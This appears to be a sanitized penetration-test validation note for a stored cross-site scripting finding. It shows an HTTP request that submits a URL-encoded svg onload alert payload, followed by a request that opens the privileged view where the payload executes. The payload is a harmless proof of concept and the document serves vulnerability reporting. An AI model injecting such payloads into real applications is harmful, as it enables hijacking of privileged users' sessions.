# F-05 Technical Validation

> Sanitized reconstruction. The original input field, route names, identifiers, session material, and payload are not reproduced. The example preserves the confirmed persistence and later browser-execution condition.

## Stored input

A controlled script-bearing value was submitted through the affected write path and accepted for persistent storage.

```http
POST / HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=[affected-write-flow]&state=[user-state]&value=%3Csvg%2Fonload%3Dalert%281%29%3E
```

## Subsequent rendering

The stored value was later rendered in a privileged application view. When that view was opened in a browser, the controlled script executed in the page context.

```http
POST /?[privileged-view] HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=privileged-view&state=[privileged-state]
```

## Security conclusion

The issue required persistence and execution during a later render in another application view, distinguishing it from reflected XSS and confirming stored cross-site scripting.
